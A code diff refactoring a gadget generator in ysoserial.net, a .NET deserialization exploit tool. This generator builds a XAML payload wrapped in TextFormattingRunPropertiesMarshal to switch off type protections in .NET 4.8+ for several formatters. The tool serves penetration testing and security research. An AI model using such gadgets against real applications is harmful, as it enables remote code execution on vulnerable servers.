@@ -1,5 +1,5 @@
-﻿using System;
-using System.Collections.Generic;
+﻿using System.Collections.Generic;
+using ysoserial.Helpers;
 
 namespace ysoserial.Generators
 {
@@ -15,9 +15,14 @@ namespace ysoserial.Generators
             return "Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored.";
         }
 
-        public override string Credit()
+        public override string Finders()
         {
             return "Nick Landers";
+        }
+
+        public override List<string> Labels()
+        {
+            return new List<string> { GadgetTypes.BridgeAndDerived };
         }
 
         public override List<string> SupportedFormatters()
@@ -25,7 +30,7 @@ namespace ysoserial.Generators
             return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify)
+        public override object Generate(string formatter, InputArgs inputArgs)
         {
             string xaml_payload = @"<ResourceDictionary
 xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
@@ -58,14 +63,14 @@ xmlns:r=""clr-namespace:System.Reflection;assembly=mscorlib"">
     </ObjectDataProvider>
 </ResourceDictionary>";
             
-            if (minify)
+            if (inputArgs.Minify)
             {
-                xaml_payload = Helpers.XMLMinifier.Minify(xaml_payload, null, null);
+                xaml_payload = XMLMinifier.Minify(xaml_payload, null, null);
             }
 
             TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
-            return Serialize(payload, formatter, test, minify);
+            return Serialize(payload, formatter, inputArgs);
         }
-
+        
     }
 }
